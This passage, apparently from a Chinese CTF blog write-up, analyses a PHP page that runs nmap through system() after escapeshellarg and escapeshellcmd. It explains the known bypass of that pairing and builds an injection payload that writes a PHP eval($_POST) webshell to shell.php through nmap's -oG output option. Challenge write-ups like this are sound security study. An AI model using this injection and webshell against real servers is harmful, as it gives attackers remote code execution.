    $_SERVER[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>] = $_SERVER[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];
&#125;
<span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;host&#x27;</span>])) &#123;
    highlight_file(<span class="hljs-keyword">__FILE__</span>);
&#125; <span class="hljs-keyword">else</span> &#123;
    $host = $_GET[<span class="hljs-string">&#x27;host&#x27;</span>];
    $host = escapeshellarg($host);  <span class="hljs-comment">//对参数host过滤了</span>
    $host = escapeshellcmd($host);
    $sandbox = md5(<span class="hljs-string">&quot;glzjin&quot;</span>. $_SERVER[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]);
    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;you are in sandbox &#x27;</span>.$sandbox;
    @mkdir($sandbox);
    chdir($sandbox);
    <span class="hljs-keyword">echo</span> system(<span class="hljs-string">&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;</span>.$host);
&#125;</code></pre>
<p>REMOTE_ADDR不能伪造，然后这里也不能产生影响</p>
<p><strong>escapeshellarg</strong>本以为是自定义函数，但发现不是，是官方函数，防注入的，但可以绕过</p>
<blockquote>
<p><strong>应用使用</strong><code>escapeshellarg -&gt; escapeshellcmd</code><strong>这样的流程来处理输入是存在隐患的</strong></p>
</blockquote>
<pre><code class="hljs lsl"><span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>&#x27; -v -d a=<span class="hljs-number">1</span>
经过escapeshellarg()函数处理后变为： &#x27;<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>&#x27;\&#x27;&#x27; -v -d a=<span class="hljs-number">1</span>&#x27;
也就是将其中的&#x27;单引号转义，再将左右两部分用单引号括起来从而起到连接的作用，这样左右就形成闭合，命令就被当作简单的字符串。

接着经过escapeshellcmd()函数处理后变成：&#x27;<span class="hljs-number">172.17</span><span class="hljs-number">.0</span><span class="hljs-number">.2</span>&#x27;\\&#x27;&#x27; -v -d a=<span class="hljs-number">1</span>\&#x27;
也就是说对\以及最后那个不配对儿的引号进行了转义

执行的命令是curl &#x27;<span class="hljs-number">172.17</span><span class="hljs-number">.0</span><span class="hljs-number">.2</span>&#x27;\\&#x27;&#x27; -v -d a=<span class="hljs-number">1</span>\&#x27;，由于中间的\\被解释为\而不再是转义字符，所以后面的&#x27;没有被转义，与再后面的&#x27;配对儿成了一个空白连接符。所以可以简化为curl <span class="hljs-number">172.17</span><span class="hljs-number">.0</span><span class="hljs-number">.2</span>\ -v -d a=<span class="hljs-number">1</span>&#x27;，即向<span class="hljs-number">172.17</span><span class="hljs-number">.0</span><span class="hljs-number">.2</span>\发起请求，POST 数据为a=<span class="hljs-number">1</span>&#x27;。</code></pre>
<h4 id="namp写webshell">namp写webshell</h4>
<p>其中参数<span style="background:#FF9999;"><code>-oG</code>可以实现将命令和结果写入文件，其格式为：内容
-oG 文件名称</span></p>
<pre><code class="hljs diff">Nmap的一些参数：
<span class="hljs-deletion">-oN 标准保存</span>
<span class="hljs-deletion">-oX XML保存</span>
<span class="hljs-deletion">-oG Grep保存</span>
<span class="hljs-deletion">-oA 保存到所有格式</span>
<span class="hljs-deletion">-append-output 补充保存文件</span></code></pre>
<p>构造</p>
<pre><code class="hljs php"><span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> | <span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>($_POST[hack]);<span class="hljs-meta">?&gt;</span> -oG shell.php</code></pre>
<p>但这样会被escapeshellarg()与escapeshellcmd()函数处理为：</p>
<pre><code class="hljs taggerscript">&#x27;127.0.0.1 | <span class="hljs-symbol">\&lt;</span><span class="hljs-symbol">\?</span>php @eval<span class="hljs-symbol">\(</span><span class="hljs-symbol">\)</span><span class="hljs-symbol">\;</span><span class="hljs-symbol">\?</span><span class="hljs-symbol">\&gt;</span> -oG hack.php&#x27;</code></pre>

            </div>
            <hr>
            <div>
              <div class="post-metas mb-3">
                
                  <div class="post-meta mr-3">
                    <i class="iconfont icon-category"></i>
                    
                      <a class="hover-with-bg" href="/categories/CTF/">CTF</a>
                    
                  </div>
                
                
                  <div class="post-meta">
                    <i class="iconfont icon-tags"></i>
                    
                      <a class="hover-with-bg" href="/tags/CTF-%E6%AF%94%E8%B5%9B/">CTF,比赛</a>
                    
                  </div>
                
              </div>
              
                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
              
              
                <div class="post-prevnext row">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2022/05/20/%E9%9D%B6%E6%9C%BA%E8%AE%B0%E5%BD%95/">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">VulnHub-Raven: 2（udf webshell上传提权）</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2021/11/25/%E7%BD%91%E7%AB%99%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">
                        <span class="hidden-mobile">网站架构知识点</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>
    
      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
        <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
  <div class="toc-body" id="toc-body"></div>
</div>

      </div>
    
  </div>
</div>

<!-- Custom -->


    

    
      <a id="scroll-top-button" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v"
                 for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
    

    
  </main>

  <footer class="text-center mt-5 py-3">
  <div class="footer-content">
     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/Romanc9" target="_blank" rel="nofollow noopener"><span>Luoman</span></a> <div> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/js/duration.js"></script> </div> 
  </div>
  
  <div class="statistics">
    
    

    
      
        <!-- LeanCloud 统计PV -->
        <span id="leancloud-site-pv-container" style="display: none">
            总访问量 
            <span id="leancloud-site-pv"></span>
             次
          </span>
      
      
        <!-- LeanCloud 统计UV -->
        <span id="leancloud-site-uv-container" style="display: none">
            总访客数 
            <span id="leancloud-site-uv"></span>
             人
          </span>
      

    
  </div>


  

  
</footer>

<!-- SCRIPTS -->

  <script  src="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":200})
    NProgress.start()
    document.addEventListener('DOMContentLoaded', function() {
      window.NProgress && window.NProgress.inc();
    })
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://cdn.staticfile.org/jquery/3.5.1/jquery.min.js" ></script>
<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/js/bootstrap.min.js" ></script>
<script  src="/js/debouncer.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>

<!-- Plugins -->


  
    <script  src="/js/lazyload.js" ></script>
  



  



  <script  src="https://cdn.staticfile.org/tocbot/4.12.0/tocbot.min.js" ></script>



  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>



  <script  src="https://cdn.staticfile.org/anchor-js/4.3.0/anchor.min.js" ></script>



  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>



  <script defer src="/js/leancloud.js" ></script>



  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var title = document.getElementById('subtitle').title;
      
      typing(title)
      
    })(window, document);
  </script>



  <script  src="/js/local-search.js" ></script>
  <script>
    (function () {
      var path = "/local-search.xml";
      var inputArea = document.querySelector("#local-search-input");
      inputArea.onclick = function () {
        searchFunc(path, 'local-search-input', 'local-search-result');
        this.onclick = null
      }
    })()
  </script>












  

  

  

  

  

  





<!-- 主题的启动项 保持在最底部 -->
<script  src="/js/boot.js" ></script>



</body>
</html>
